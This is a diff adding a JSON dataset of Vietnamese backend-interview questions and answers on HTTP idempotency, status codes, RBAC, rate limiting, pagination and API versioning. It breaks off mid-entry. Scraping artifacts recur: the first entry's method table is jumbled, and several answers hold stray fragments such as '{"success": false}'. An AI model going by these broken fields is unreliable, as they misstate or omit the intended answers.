@@ -1,0 +1,1223 @@
+[
+  {
+    "id": "500e9911-fc96-5270-8cd4-d43637b63ca0",
+    "question": "Safe và idempotent trong HTTP nghĩa là gì? Method nào thuộc loại nào?",
+    "level": "basic",
+    "levelLabel": "CƠ BẢN",
+    "sourceUrl": "https://luyenphongvan.online/q/96750-safe-va-idempotent-trong-http-nghia-la-gi-method-nao-thuoc-loai-nao",
+    "slug": "safe-va-idempotent-trong-http-nghia-la-gi-method-nao-thuoc-loai-nao-500e9911-fc96-5270-8cd4-d43637b63ca0",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Safe = method chỉ đọc, không làm thay đổi trạng thái phía server (GET, HEAD, OPTIONS). Idempotent = gọi 1 lần hay N lần cho cùng kết quả trạng thái (GET, HEAD, PUT, DELETE, OPTIONS). Mọi method safe đều idempotent, ngược lại thì không."
+      ],
+      "details": [
+        "Hệ quả thực tế:\n- Proxy, crawler, prefetch của trình duyệt được phép gọi GET tự do. Nếu đặt GET /orders/1/delete thì một con bot quét link cũng xoá sạch dữ liệu.\n- Client và load balancer chỉ tự retry an toàn với method idempotent. POST bị timeout thì không biết server đã xử lý hay chưa — đó là lý do phải có idempotency key.",
+        "DELETE vẫn idempotent dù lần đầu trả 204 còn lần sau trả 404: idempotent nói về trạng thái cuối cùng của server, không phải về response giống hệt nhau."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": [
+        {
+          "cells": [
+            "Method",
+            "Safe",
+            "GET / HEAD",
+            "có",
+            "có",
+            "PUT",
+            "không",
+            "có",
+            "DELETE",
+            "không",
+            "có",
+            "POST",
+            "không",
+            "PATCH"
+          ]
+        }
+      ]
+    },
+    "legacyId": 1,
+    "sourceSlug": "96750-safe-va-idempotent-trong-http-nghia-la-gi-method-nao-thuoc-loai-nao"
+  },
+  {
+    "id": "7f2543a6-3316-52cf-8cfc-8872ad097463",
+    "question": "PUT khác PATCH thế nào? JSON Merge Patch và JSON Patch khác gì nhau?",
+    "level": "basic",
+    "levelLabel": "CƠ BẢN",
+    "sourceUrl": "https://luyenphongvan.online/q/96751-put-khac-patch-the-nao-json-merge-patch-va-json-patch-khac-gi-nhau",
+    "slug": "put-khac-patch-the-nao-json-merge-patch-va-json-patch-khac-gi-nhau-7f2543a6-3316-52cf-8cfc-8872ad097463",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Hai định dạng PATCH phổ biến:\n- JSON Merge Patch (application/merge-patch+json): body trông giống resource, giá trị null nghĩa là xoá field. Đơn giản, nhưng vì thế không thể set một field thành null và không sửa được phần tử trong mảng.\n- JSON Patch (application/json-patch+json): mảng thao tác add / remove / replace / move / test, có path kiểu JSON Pointer. Diễn đạt được mọi thay đổi, kể cả trên mảng, nhưng body khó đọc hơn."
+      ],
+      "details": [
+        "Lưu ý phỏng vấn hay hỏi: PUT idempotent, PATCH không đảm bảo idempotent (vd operation {\"op\":\"add\",\"path\":\"/tags/-\",\"value\":\"vip\"} gọi 2 lần thì thêm 2 tag). Thực tế nhiều API dùng PATCH với body merge và giữ nó idempotent — nhưng đó là lựa chọn thiết kế, không phải bảo đảm của giao thức."
+      ],
+      "points": [],
+      "sections": [
+        "PUT thay thế toàn bộ resource bằng body gửi lên: field nào không có trong body được coi như bị xoá/đưa về mặc định. PATCH chỉ mô tả phần thay đổi."
+      ],
+      "codeExamples": [
+        {
+          "language": "HTTP",
+          "code": "PUT /users/7\n{ \"name\": \"An\", \"email\": \"an@ex.com\", \"phone\": \"0900\" }\n// thiếu phone trong lần PUT sau -> phone bị xoá\n\nPATCH /users/7\nContent-Type: application/merge-patch+json\n{ \"phone\": null }\n// chỉ đụng vào phone"
+        }
+      ],
+      "tables": []
+    },
+    "legacyId": 2,
+    "sourceSlug": "96751-put-khac-patch-the-nao-json-merge-patch-va-json-patch-khac-gi-nhau"
+  },
+  {
+    "id": "04a5a090-cc2e-5254-a6b9-72094840d9fa",
+    "question": "Tạo resource xong trả status nào: 200, 201, 202 hay 204? Khi nào cần header Location?",
+    "level": "basic",
+    "levelLabel": "CƠ BẢN",
+    "sourceUrl": "https://luyenphongvan.online/q/96752-tao-resource-xong-tra-status-nao-200-201-202-hay-204-khi-nao-can-header-location",
+    "slug": "tao-resource-xong-tra-status-nao-200-201-202-hay-204-khi-nao-can-header-location-04a5a090-cc2e-5254-a6b9-72094840d9fa",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Chọn theo việc đã làm xong chưa và có body trả về không:",
+        "{\"success\": false}"
+      ],
+      "details": [],
+      "points": [
+        "201 Created — đã tạo xong resource mới. Kèm header Location trỏ tới URL của resource vừa tạo, body thường là chính resource đó.",
+        "200 OK — xử lý xong và có body ý nghĩa để trả (vd POST /search, hoặc POST /orders/1/cancel trả về order sau khi huỷ).",
+        "202 Accepted — server đã nhận yêu cầu nhưng chưa xử lý xong. Dùng cho job chạy nền; body/Location nên trỏ tới tài nguyên theo dõi tiến độ.",
+        "204 No Content — thành công và cố ý không có body. Hợp với DELETE hoặc PUT khi client không cần dữ liệu trả về.",
+        "Client, proxy và monitoring đều đọc status code — trả sai làm mất khả năng retry tự động và làm sai metric lỗi."
+      ],
+      "sections": [],
+      "codeExamples": [
+        {
+          "language": "HTTP",
+          "code": "POST /orders\n\nHTTP/1.1 201 Created\nLocation: /orders/8f21\nContent-Type: application/json\n{ \"id\": \"8f21\", \"status\": \"pending\" }"
+        }
+      ],
+      "tables": []
+    },
+    "legacyId": 3,
+    "sourceSlug": "96752-tao-resource-xong-tra-status-nao-200-201-202-hay-204-khi-nao-can-header-location"
+  },
+  {
+    "id": "4e4d5e01-e342-5adb-8f1b-5a04c1d5c586",
+    "question": "Dữ liệu client gửi lên bị sai thì trả 400, 422 hay 409? Phân biệt ba mã này.",
+    "level": "basic",
+    "levelLabel": "CƠ BẢN",
+    "sourceUrl": "https://luyenphongvan.online/q/96753-du-lieu-client-gui-len-bi-sai-thi-tra-400-422-hay-409-phan-biet-ba-ma-nay",
+    "slug": "du-lieu-client-gui-len-bi-sai-thi-tra-400-422-hay-409-phan-biet-ba-ma-nay-4e4d5e01-e342-5adb-8f1b-5a04c1d5c586",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Ba mã ứng với ba tầng lỗi khác nhau:",
+        "nhất quán trong toàn API"
+      ],
+      "details": [
+        "Đừng dùng 500 cho lỗi validate: 5xx nghĩa là lỗi của server, sẽ kích hoạt cảnh báo và retry vô ích."
+      ],
+      "points": [
+        "400 Bad Request — request sai cú pháp, server không parse nổi: JSON hỏng, thiếu field bắt buộc, kiểu dữ liệu sai (age: \"abc\"), query param không hợp lệ.",
+        "422 Unprocessable Content — cú pháp đúng, parse được, nhưng vi phạm luật nghiệp vụ hoặc ràng buộc ngữ nghĩa: email sai định dạng, end_date trước start_date, số lượng vượt tồn kho.",
+        "409 Conflict — request hợp lệ nhưng xung đột với trạng thái hiện tại của resource: username đã tồn tại, huỷ đơn đã giao, cập nhật bản ghi đã bị người khác sửa (xung đột version)."
+      ],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 4,
+    "sourceSlug": "96753-du-lieu-client-gui-len-bi-sai-thi-tra-400-422-hay-409-phan-biet-ba-ma-nay"
+  },
+  {
+    "id": "43aa0e01-fd5b-54c4-817d-f0d4aa2c2696",
+    "question": "Vì sao ghi DB xong rồi publish message lại làm dữ liệu lệch nhau? (dual write problem)",
+    "level": "basic",
+    "levelLabel": "CƠ BẢN",
+    "sourceUrl": "https://luyenphongvan.online/q/96850-vi-sao-ghi-db-xong-roi-publish-message-lai-lam-du-lieu-lech-nhau-dual-write-prob",
+    "slug": "vi-sao-ghi-db-xong-roi-publish-message-lai-lam-du-lieu-lech-nhau-dual-write-problem-43aa0e01-fd5b-54c4-817d-f0d4aa2c2696",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Vì DB và message broker là hai hệ thống riêng biệt, không nằm chung một transaction.",
+        "Ghi DB xong, publish lỗi"
+      ],
+      "details": [
+        "Bạn ghi vào cả hai trong cùng một hàm, nhưng không có gì đảm bảo cả hai cùng thành công.",
+        "cùng một transaction DB",
+        "Đổi thứ tự hai lệnh không giải quyết được, chỉ đổi kiểu lỗi. Bọc try/catch rồi retry publish cũng không cứu nổi trường hợp process chết giữa chừng.",
+        "transactional outbox"
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [
+        {
+          "language": "JAVA",
+          "code": "// dual write: two systems, no shared transaction\norderRepository.save(order);   // committed\nbroker.publish(orderCreated);  // process crashes here -> event lost forever"
+        }
+      ],
+      "tables": []
+    },
+    "legacyId": 5,
+    "sourceSlug": "96850-vi-sao-ghi-db-xong-roi-publish-message-lai-lam-du-lieu-lech-nhau-dual-write-prob"
+  },
+  {
+    "id": "57c888b9-4ff2-5672-b116-ae39df0dac87",
+    "question": "Consumer idempotent nghĩa là gì? Chọn khoá chống trùng (dedup key) thế nào?",
+    "level": "basic",
+    "levelLabel": "CƠ BẢN",
+    "sourceUrl": "https://luyenphongvan.online/q/96852-consumer-idempotent-nghia-la-gi-chon-khoa-chong-trung-dedup-key-the-nao",
+    "slug": "consumer-idempotent-nghia-la-gi-chon-khoa-chong-trung-dedup-key-the-nao-57c888b9-4ff2-5672-b116-ae39df0dac87",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Idempotent nghĩa là xử lý cùng một message nhiều lần cho kết quả giống hệt xử lý một lần. Cần thiết vì broker giao at-least-once: retry, rebalance, ack rớt đều sinh bản lặp."
+      ],
+      "details": [
+        "Cách làm phổ biến — lưu dấu vết message đã xử lý trong cùng transaction với thay đổi nghiệp vụ:",
+        "Chọn dedup key:\n- Ưu tiên khoá nghiệp vụ ổn định do producer sinh ra: order_id, payment_id, event_id (UUID gắn vào message lúc tạo).\n- Không dùng offset/delivery tag của broker — chúng đổi khi replay hoặc đổi partition.\n- Không hash toàn bộ payload nếu payload chứa timestamp gửi, vì retry sẽ ra hash khác.",
+        "Một số thao tác vốn đã idempotent (gán trạng thái status = 'paid', UPSERT theo khoá) thì không cần bảng dedup; thao tác cộng dồn (balance + x, tăng counter, gửi email) thì bắt buộc phải có."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [
+        {
+          "language": "SQL",
+          "code": "-- table of consumed message ids, unique index does the deduplication\nBEGIN;\nINSERT INTO processed_messages (message_id) VALUES ($1);  -- violates unique -> already handled\nUPDATE accounts SET balance = balance + $2 WHERE id = $3;\nCOMMIT;"
+        }
+      ],
+      "tables": []
+    },
+    "legacyId": 6,
+    "sourceSlug": "96852-consumer-idempotent-nghia-la-gi-chon-khoa-chong-trung-dedup-key-the-nao"
+  },
+  {
+    "id": "335a56b2-98fd-5baf-80aa-88d6cd522e62",
+    "question": "Trong hệ thống có thanh toán, bạn lưu số tiền vào DB bằng kiểu dữ liệu gì? Nhiều loại tiền tệ thì xử lý ra sao?",
+    "level": "basic",
+    "levelLabel": "CƠ BẢN",
+    "sourceUrl": "https://luyenphongvan.online/q/96901-trong-he-thong-co-thanh-toan-ban-luu-so-tien-vao-db-bang-kieu-du-lieu-gi-nhieu-l",
+    "slug": "trong-he-thong-co-thanh-toan-ban-luu-so-tien-vao-db-bang-kieu-du-lieu-gi-nhieu-loai-tien-te-thi-xu-l-335a56b2-98fd-5baf-80aa-88d6cd522e62",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Không bao giờ dùng float/double cho tiền. Số thực nhị phân không biểu diễn chính xác 0.1, cộng dồn nhiều dòng sẽ lệch xu và lệch đối soát."
+      ],
+      "details": [
+        "Hai cách đúng:\n- Số nguyên theo đơn vị nhỏ nhất: lưu amount_minor BIGINT. VND không có phần lẻ nên 150000 = 150.000đ; USD thì 1050 = 10.50 USD. Cộng trừ nhanh, không có sai số.\n- NUMERIC(p, s) của Postgres (kiểu thập phân chính xác): NUMERIC(19, 4) cho đa số hệ thống. Chậm hơn integer nhưng biểu diễn đúng và chia được.",
+        "Đa tiền tệ:\n- Lưu currency CHAR(3) ngay cạnh mỗi số tiền (ISO 4217). Một cột tiền không có cột currency là bug chờ xảy ra.\n- Không cộng hai số tiền khác currency. Muốn tổng hợp thì quy đổi tường minh.\n- Khi giao dịch có quy đổi, lưu snapshot tỉ giá và thời điểm vào chính bản ghi giao dịch. Tỉ giá đổi mỗi ngày, tính lại theo tỉ giá hôm nay sẽ ra số khác với hoá đơn đã phát hành.",
+        "Làm tròn: chỉ làm tròn ở bước cuối cùng khi hiển thị hoặc khi chốt số phải thu, và ghi rõ quy tắc. Định dạng hiển thị để cho client làm bằng Intl.NumberFormat, backend trả về số thô kèm mã tiền tệ."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 7,
+    "sourceSlug": "96901-trong-he-thong-co-thanh-toan-ban-luu-so-tien-vao-db-bang-kieu-du-lieu-gi-nhieu-l"
+  },
+  {
+    "id": "ff917c37-45d5-5f15-9339-430121295009",
+    "question": "Bạn sẽ thiết kế phân quyền theo vai trò (RBAC) cho hệ thống có admin, nhân viên, khách hàng thế nào?",
+    "level": "basic",
+    "levelLabel": "CƠ BẢN",
+    "sourceUrl": "https://luyenphongvan.online/q/96902-ban-se-thiet-ke-phan-quyen-theo-vai-tro-rbac-cho-he-thong-co-admin-nhan-vien-kha",
+    "slug": "ban-se-thiet-ke-phan-quyen-theo-vai-tro-rbac-cho-he-thong-co-admin-nhan-vien-khach-hang-the-nao-ff917c37-45d5-5f15-9339-430121295009",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Mô hình tối thiểu là ba bảng: users, roles, permissions, cộng hai bảng nối user_roles và role_permissions. User nhận role, role gom permission dạng động từ + tài nguyên (order.read, order.refund, user.ban).",
+        "Ghi quyền vào JWT thì tiện nhưng token sẽ cũ khi admin thu hồi quyền; hoặc để token sống ngắn, hoặc đọc quyền từ DB/cache mỗi request."
+      ],
+      "details": [
+        "Quy tắc khi cài đặt:\n- Kiểm tra ở server, mọi request. Ẩn nút trên UI chỉ là trải nghiệm, không phải bảo mật. Attacker gọi thẳng API.\n- Kiểm tra theo permission, không theo tên role. Viết can(user, 'order.refund') thay vì if (user.role === 'admin'). Khi thêm role \"kế toán\" chỉ cần gán permission, không phải sửa rải rác trong code.\n- Deny by default: endpoint không khai báo quyền thì bị chặn, chứ không phải mở.\n- Đặt điểm kiểm tra ở một lớp duy nhất (middleware hoặc decorator trên route) để không ai quên.",
+        "RBAC thuần chỉ trả lời \"được làm hành động này không\"; câu \"được đụng vào bản ghi nào\" cần thêm một lớp kiểm tra quyền sở hữu."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [
+        {
+          "language": "TS",
+          "code": "router.post('/orders/:id/refund', requirePermission('order.refund'), refundHandler)"
+        }
+      ],
+      "tables": []
+    },
+    "legacyId": 8,
+    "sourceSlug": "96902-ban-se-thiet-ke-phan-quyen-theo-vai-tro-rbac-cho-he-thong-co-admin-nhan-vien-kha"
+  },
+  {
+    "id": "fe53a504-4602-5976-93a8-51931b61a507",
+    "question": "Rate limiting là gì và có những thuật toán nào?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/91005-rate-limiting-la-gi-va-co-nhung-thuat-toan-nao",
+    "slug": "rate-limiting-la-gi-va-co-nhung-thuat-toan-nao-fe53a504-4602-5976-93a8-51931b61a507",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Rate limiting giới hạn số request một client được gửi trong khoảng thời gian → chống lạm dụng/DoS, đảm bảo công bằng, kiểm soát chi phí. Vượt hạn trả 429 Too Many Requests (thường kèm header Retry-After)."
+      ],
+      "details": [
+        "Thuật toán phổ biến:\n- Fixed window: đếm request theo cửa sổ cố định (đơn giản nhưng có burst ở ranh giới).\n- Sliding window: cửa sổ trượt, mượt hơn.\n- Token bucket: bù token đều đặn, cho phép burst có kiểm soát.\n- Leaky bucket: xử lý theo tốc độ cố định, làm phẳng traffic.",
+        "Thường đặt ở API gateway/reverse proxy, key theo user/IP/API key."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 9,
+    "sourceSlug": "91005-rate-limiting-la-gi-va-co-nhung-thuat-toan-nao"
+  },
+  {
+    "id": "c5f1a222-5605-5f01-922b-86e0487678cc",
+    "question": "Idempotency key là gì và giải quyết vấn đề gì khi retry?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/91104-idempotency-key-la-gi-va-giai-quyet-van-de-gi-khi-retry",
+    "slug": "idempotency-key-la-gi-va-giai-quyet-van-de-gi-khi-retry-c5f1a222-5605-5f01-922b-86e0487678cc",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Vấn đề: POST không idempotent — nếu client gửi tạo đơn/thanh toán rồi mạng timeout, nó không biết server đã nhận chưa. Retry khi chưa biết kết quả → tạo trùng (đơn hàng lặp, trừ tiền hai lần)."
+      ],
+      "details": [
+        "Idempotency key là một chuỗi duy nhất (thường UUID) client sinh cho mỗi thao tác và gửi kèm (vd header Idempotency-Key). Server:\n1. Lần đầu thấy key → xử lý và lưu kết quả gắn với key.\n2. Lần sau thấy cùng key → không làm lại, trả kết quả đã lưu.",
+        "Nhờ đó retry an toàn dù request thực chất là POST. Cần lưu key + kết quả trong một cửa sổ thời gian (TTL) và xử lý race (khóa/INSERT unique). Đây là cơ chế Stripe/PayPal dùng cho API thanh toán."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 10,
+    "sourceSlug": "91104-idempotency-key-la-gi-va-giai-quyet-van-de-gi-khi-retry"
+  },
+  {
+    "id": "3d59985a-699d-5242-b7fd-e9fda77fc4cd",
+    "question": "Phân trang offset và cursor khác nhau thế nào? Khi nào chọn cursor?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/91105-phan-trang-offset-va-cursor-khac-nhau-the-nao-khi-nao-chon-cursor",
+    "slug": "phan-trang-offset-va-cursor-khac-nhau-the-nao-khi-nao-chon-cursor-3d59985a-699d-5242-b7fd-e9fda77fc4cd",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Chốt: danh sách nhỏ, cần nhảy trang → offset; feed vô hạn, dữ liệu đổi liên tục, bảng lớn → cursor."
+      ],
+      "details": [],
+      "points": [
+        "Offset (LIMIT 20 OFFSET 40 / ?page=3): đơn giản, nhảy trang bất kỳ, hiện tổng số trang. Hai điểm yếu: (1) chậm ở trang sâu — DB vẫn quét rồi bỏ 40 hàng đầu; (2) trôi kết quả — nếu có bản ghi được thêm/xóa giữa chừng, hàng bị lặp hoặc bị nhảy.",
+        "Cursor (keyset): dùng con trỏ là giá trị của hàng cuối (WHERE id < last_id ORDER BY id DESC LIMIT 20). Nhanh và ổn định ở mọi độ sâu vì tận dụng index, không đếm offset. Đổi lại: không nhảy trang tùy ý, chỉ tiến/lùi tuần tự, và cần cột sắp xếp ổn định + duy nhất."
+      ],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 11,
+    "sourceSlug": "91105-phan-trang-offset-va-cursor-khac-nhau-the-nao-khi-nao-chon-cursor"
+  },
+  {
+    "id": "8e825e44-50f2-52ca-835f-f458053779e6",
+    "question": "Thiết kế error contract cho API thế nào? RFC 9457 (problem+json) gồm những field nào?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/96754-thiet-ke-error-contract-cho-api-the-nao-rfc-9457-problem-json-gom-nhung-field-na",
+    "slug": "thiet-ke-error-contract-cho-api-the-nao-rfc-9457-problem-json-gom-nhung-field-nao-8e825e44-50f2-52ca-835f-f458053779e6",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Nguyên tắc: một định dạng lỗi duy nhất cho toàn API, máy đọc được và người debug được. RFC 9457 chuẩn hoá đúng việc đó với Content-Type: application/problem+json.",
+        "Hai lỗi thiết kế hay gặp:"
+      ],
+      "details": [
+        "Các field chuẩn:\n- type — URI định danh loại lỗi (client so khớp field này, không so khớp chuỗi title).\n- title — mô tả ngắn, cố định cho mỗi type.\n- status — mã HTTP, lặp lại cho tiện log.\n- detail — mô tả cho lần lỗi cụ thể này.\n- instance — URI của lần xảy ra lỗi.\n- Được phép thêm extension member tuỳ ý (errors, trace_id, balance...).",
+        "Mã lỗi ổn định để client xử lý, trace_id để dev tra log — đó là hai thứ thực sự cần."
+      ],
+      "points": [
+        "trả message tiếng người thay đổi liên tục rồi client đi if (msg.includes(...));",
+        "rò rỉ stack trace hoặc câu SQL vào detail"
+      ],
+      "sections": [],
+      "codeExamples": [
+        {
+          "language": "JSON",
+          "code": "HTTP/1.1 403 Forbidden\nContent-Type: application/problem+json\n\n{\n  \"type\": \"https://api.example.com/errors/insufficient-funds\",\n  \"title\": \"Insufficient funds\",\n  \"status\": 403,\n  \"detail\": \"Balance is 30000 VND, required 120000 VND\",\n  \"instance\": \"/accounts/12/transfers/9a1\",\n  \"trace_id\": \"01J8Z...\",\n  \"balance\": 30000\n}"
+        }
+      ],
+      "tables": []
+    },
+    "legacyId": 12,
+    "sourceSlug": "96754-thiet-ke-error-contract-cho-api-the-nao-rfc-9457-problem-json-gom-nhung-field-na"
+  },
+  {
+    "id": "556c1338-ebeb-5a87-8d3b-10d30075041b",
+    "question": "User bấm nút Thanh toán hai lần do mạng chậm. Em thiết kế luồng chống tạo trùng giao dịch thế nào?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/96755-user-bam-nut-thanh-toan-hai-lan-do-mang-cham-em-thiet-ke-luong-chong-tao-trung-g",
+    "slug": "user-bam-nut-thanh-toan-hai-lan-do-mang-cham-em-thiet-ke-luong-chong-tao-trung-giao-dich-the-nao-556c1338-ebeb-5a87-8d3b-10d30075041b",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Dùng idempotency key do client sinh, server ghi nhớ kết quả và phát lại thay vì xử lý lại.",
+        "Hai chi tiết hay bị hỏi thêm:\n- Lưu request_hash (hash của body) để phát hiện client dùng lại key với payload khác — trường hợp đó phải báo lỗi, không được im lặng trả kết quả cũ.\n- Ghi bản ghi khoá và ghi giao dịch phải nằm trong cùng một transaction DB, nếu không sẽ có khe hở làm tính tiền hai lần."
+      ],
+      "details": [
+        "Luồng:\n1. Client sinh key duy nhất cho mỗi ý định thanh toán (UUID v4, sinh lúc mở màn hình checkout, giữ nguyên khi retry) và gửi qua header Idempotency-Key.\n2. Server nhận request, mở transaction, INSERT bản ghi khoá (user_id, key) với ràng buộc UNIQUE.\n- Insert thành công → đây là lần đầu, xử lý thật, lưu lại status + body response vào bản ghi đó.\n- Insert đụng unique → key đã tồn tại, đọc bản ghi cũ:\n- đã có response lưu sẵn → trả nguyên response cũ (cùng status, cùng body).\n- vẫn đang xử lý (request trước chưa xong) → trả 409 Conflict để client thử lại sau.\n3. Đặt TTL cho key (Stripe giữ 24 giờ) rồi dọn bằng job nền.",
+        "Khoá theo user + key chứ không chỉ theo key, để client này không đoán được key của client khác."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [
+        {
+          "language": "SQL",
+          "code": "create table idempotency_keys (\n  user_id     bigint not null,\n  key         text   not null,\n  request_hash text  not null,\n  status_code int,\n  response_body jsonb,\n  created_at  timestamptz default now(),\n  primary key (user_id, key)\n);"
+        }
+      ],
+      "tables": []
+    },
+    "legacyId": 13,
+    "sourceSlug": "96755-user-bam-nut-thanh-toan-hai-lan-do-mang-cham-em-thiet-ke-luong-chong-tao-trung-g"
+  },
+  {
+    "id": "74c5a596-836c-533a-9d7a-174fc81fedbc",
+    "question": "API versioning nên đặt ở URL hay header? Khi nào buộc phải lên version mới và deprecate version cũ ra sao?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/96756-api-versioning-nen-dat-o-url-hay-header-khi-nao-buoc-phai-len-version-moi-va-dep",
+    "slug": "api-versioning-nen-dat-o-url-hay-header-khi-nao-buoc-phai-len-version-moi-va-deprecate-version-cu-ra-74c5a596-836c-533a-9d7a-174fc81fedbc",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Hai cách phổ biến:\n- URL path (/v1/orders) — Google API design guide và phần lớn API công khai chọn cách này. Dễ nhìn, dễ route, dễ cache, dễ chia traffic ở gateway. Nhược điểm: cùng một resource có nhiều URI.\n- Header (Accept: application/vnd.api+json; version=2 hoặc header riêng như X-GitHub-Api-Version) — URI giữ nguyên, \"thuần REST\" hơn, nhưng khó test bằng trình duyệt và dễ bị quên khi cache."
+      ],
+      "details": [
+        "Thực dụng: URL cho major version, header cho biến thể nhỏ. Đừng làm minor version (/v1.2) — không ai muốn sửa client vì một field mới.",
+        "Chỉ bump major khi có breaking change: xoá/đổi tên field, đổi kiểu dữ liệu, siết validation, đổi ngữ nghĩa field cũ, đổi mã lỗi. Thêm field mới, thêm endpoint, thêm giá trị enum optional → không cần version mới.",
+        "Quy trình deprecate an toàn:\n1. Công bố lịch tắt kèm changelog và hướng dẫn migrate.\n2. Trả header báo hiệu trên response của version cũ: Deprecation: true và Sunset: <ngày tắt> (RFC 8594), kèm Link: <docs>; rel=\"deprecation\".\n3. Theo dõi metric theo version + theo client để biết ai còn dùng, chủ động liên hệ.\n4. Trước ngày tắt, chạy vài đợt brownout (cố tình trả lỗi trong khung giờ ngắn) để client phát hiện mình chưa migrate.\n5. Tắt hẳn, trả 410 Gone kèm link tài liệu."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 14,
+    "sourceSlug": "96756-api-versioning-nen-dat-o-url-hay-header-khi-nao-buoc-phai-len-version-moi-va-dep"
+  },
+  {
+    "id": "f71ed6f0-08d6-5a79-bf95-b056bfaf215f",
+    "question": "Rate limiting dùng thuật toán nào? Server phải trả header gì để client biết đường chờ?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/96757-rate-limiting-dung-thuat-toan-nao-server-phai-tra-header-gi-de-client-biet-duong",
+    "slug": "rate-limiting-dung-thuat-toan-nao-server-phai-tra-header-gi-de-client-biet-duong-cho-f71ed6f0-08d6-5a79-bf95-b056bfaf215f",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Thuật toán, từ đơn giản đến chính xác:\n- Fixed window — đếm request theo từng phút. Đơn giản nhất nhưng có lỗi biên: 100 request cuối phút 1 và 100 request đầu phút 2 → 200 request trong 2 giây vẫn hợp lệ.\n- Sliding window log/counter — chính xác hơn, sliding log lưu timestamp từng request (tốn bộ nhớ), sliding counter nội suy từ window trước (đủ tốt, rẻ).\n- Token bucket — bucket chứa N token, nạp lại đều đặn r token/giây; mỗi request tiêu 1 token. Cho phép burst tới sức chứa bucket rồi ép về tốc độ trung bình. Đây là lựa chọn mặc định cho API vì hợp với hành vi client thật.\n- Leaky bucket — làm phẳng hoàn toàn, output đều tăm tắp, không cho burst; hợp với việc bảo vệ downstream có công suất cố định.",
+        "GitHub trả bộ tương đương (x-ratelimit-limit/remaining/reset) và khuyến nghị client tôn trọng retry-after, không retry trước thời điểm đó."
+      ],
+      "details": [
+        "Response khi vượt hạn: trả 429 Too Many Requests kèm Retry-After (số giây hoặc mốc thời gian). Kèm theo bộ header quota để client tự điều tiết mà không cần bị chặn:",
+        "Còn lại là chuyện thiết kế: đếm theo cái gì (API key > user id > IP, vì NAT làm nhiều user chung IP), lưu counter ở Redis để nhiều instance dùng chung, và tách hạn mức riêng cho endpoint đắt (search, export) thay vì một hạn mức chung cho mọi thứ."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 15,
+    "sourceSlug": "96757-rate-limiting-dung-thuat-toan-nao-server-phai-tra-header-gi-de-client-biet-duong"
+  },
+  {
+    "id": "f510ee97-d7e8-5f01-9a97-ca1d0a056782",
+    "question": "Endpoint list cần lọc, sắp xếp và chọn field. Em thiết kế query param thế nào cho gọn và an toàn?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/96758-endpoint-list-can-loc-sap-xep-va-chon-field-em-thiet-ke-query-param-the-nao-cho",
+    "slug": "endpoint-list-can-loc-sap-xep-va-chon-field-em-thiet-ke-query-param-the-nao-cho-gon-va-an-toan-f510ee97-d7e8-5f01-9a97-ca1d0a056782",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
